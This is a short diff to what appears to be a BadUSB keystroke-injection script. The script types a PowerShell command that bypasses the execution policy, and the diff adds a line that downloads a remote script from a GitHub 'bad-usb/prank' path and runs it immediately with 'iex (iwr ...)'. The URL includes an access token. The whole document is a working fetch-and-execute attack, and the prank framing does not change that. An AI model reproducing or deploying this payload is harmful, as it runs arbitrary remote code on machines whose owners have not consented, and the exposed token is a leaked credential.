@@ -10,3 +10,7 @@ DELAY 2000
 STRING set-executionpolicy bypass -scope process -force
 ENTER
 DELAY 250
+
+STRING iex (iwr 'https://raw.githubusercontent.com/simongoldstone/scripts/refs/heads/main/bad-usb/prank/gotchya/gotchya.ps1?token=GHSAT0AAAAAADA5X7UVB7OVOXKO2FYVLM6CZ76QP5Q' -UseBasicParsing)
+ENTER
+
